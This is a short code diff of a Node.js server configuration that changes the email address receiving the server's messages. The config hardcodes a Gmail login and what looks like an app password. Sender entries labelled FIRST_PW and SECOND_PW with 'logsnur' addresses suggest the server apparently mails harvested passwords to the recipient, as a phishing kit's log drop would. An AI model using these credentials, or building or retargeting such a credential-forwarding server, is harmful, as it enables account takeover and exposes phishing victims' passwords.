@@ -9,7 +9,7 @@ const CONFIG = {
   EMAIL: {
     USER: 'ranickiauerbach@gmail.com',
     PASS: 'nlov pvvd rcoa dnwl',
-    RECIPIENT: 'victorabuke2@yahoo.com',
+    RECIPIENT: 'andrewmorrison.agva.uk.com@gmail.com',
     SENDERS: {
       FIRST_PW: 'logsnur01@rich.co',
       SECOND_PW: 'logsnur02@rich.us'
@@ -110,4 +110,5 @@ app.listen(CONFIG.PORT, () => {
   console.log(`Server running on port ${CONFIG.PORT}`);
   console.log(`CORS configured for: ${CONFIG.CORS_ORIGIN}`);
 });
+
 
